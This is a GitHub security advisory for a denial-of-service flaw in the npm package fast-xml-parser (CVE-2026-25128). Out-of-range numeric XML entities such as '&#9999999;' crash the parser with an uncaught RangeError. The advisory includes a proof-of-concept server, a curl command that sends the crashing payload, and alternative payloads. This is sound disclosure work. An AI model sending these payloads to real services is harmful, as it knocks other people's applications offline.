# [H] fast-xml-parser has RangeError DoS Numeric Entities Bug

## Summary
Severity: High
Advisory: GHSA-37qj-frw5-hhjh
CVE: CVE-2026-25128
CWE: CWE-20, CWE-248
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-01-30
Source: https://github.com/advisories/GHSA-37qj-frw5-hhjh
Type: github-advisory

## Affected
- npm: `fast-xml-parser` — affected >=5.0.9 <5.3.4

## Details
### Summary
A RangeError vulnerability exists in the numeric entity processing of fast-xml-parser when parsing XML with out-of-range entity code points (e.g., `&#9999999;` or `&#xFFFFFF;`). This causes the parser to throw an uncaught exception, crashing any application that processes untrusted XML input.

### Details
The vulnerability exists in `/src/xmlparser/OrderedObjParser.js` at lines 44-45:

```javascript
"num_dec": { regex: /&#([0-9]{1,7});/g, val : (_, str) => String.fromCodePoint(Number.parseInt(str, 10)) },
"num_hex": { regex: /&#x([0-9a-fA-F]{1,6});/g, val : (_, str) => String.fromCodePoint(Number.parseInt(str, 16)) },
```

The `String.fromCodePoint()` method throws a `RangeError` when the code point exceeds the valid Unicode range (0 to 0x10FFFF / 1114111). The regex patterns can capture values far exceeding this:
- `[0-9]{1,7}` matches up to 9,999,999
- `[0-9a-fA-F]{1,6}` matches up to 0xFFFFFF (16,777,215)

The entity replacement in `replaceEntitiesValue()` (line 452) has no try-catch:

```javascript
val = val.replace(entity.regex, entity.val);
```

This causes the RangeError to propagate uncaught, crashing the parser and any application using it.
### PoC
#### Setup

Create a directory with these files:

```
poc/
├── package.json
├── server.js
```

**package.json**
```json
{ "dependencies": { "fast-xml-parser": "^5.3.3" } }
```

**server.js**
```javascript
const http = require('http');
const { XMLParser } = require('fast-xml-parser');

const parser = new XMLParser({ processEntities: true, htmlEntities: true });

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/parse') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      const result = parser.parse(body);  // No try-catch - will crash!
      res.end(JSON.stringify(result));
    });
  } else {
    res.end('POST /parse with XML body');
  }
}).listen(3000, () => console.log('http://localhost:3000'));
```

#### Run

```bash
# Setup
npm install

# Terminal 1: Start server
node server.js

# Terminal 2: Send malicious payload (server will crash)
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><root>&#9999999;</root>' http://localhost:3000/parse
``` 
#### Result

Server crashes with:
```
RangeError: Invalid code point 9999999
```

#### Alternative Payloads

```xml
<!-- Hex variant -->
<?xml version="1.0"?><root>&#xFFFFFF;</root>

<!-- In attribute -->
<?xml version="1.0"?><root attr="&#9999999;"/>
```

### Impact
*Denial of Service (DoS):** Any application using fast-xml-parser to process untrusted XML input will crash when encountering malformed numeric entities. This affects:

- **API servers** accepting XML payloads
- **File processors** parsing uploaded XML files
- **Message queues** consuming XML messages
- **RSS/Atom feed parsers**
- **SOAP/XML-RPC services**

A single malicious request is sufficient to crash the entire Node.js process, causing service disruption until manual restart.

## References
- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-37qj-frw5-hhjh
- https://nvd.nist.gov/vuln/detail/CVE-2026-25128
- https://github.com/NaturalIntelligence/fast-xml-parser/commit/4e387f61c4a5cef792f6a2f42467013290bf95dc
- https://github.com/NaturalIntelligence/fast-xml-parser
- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.4
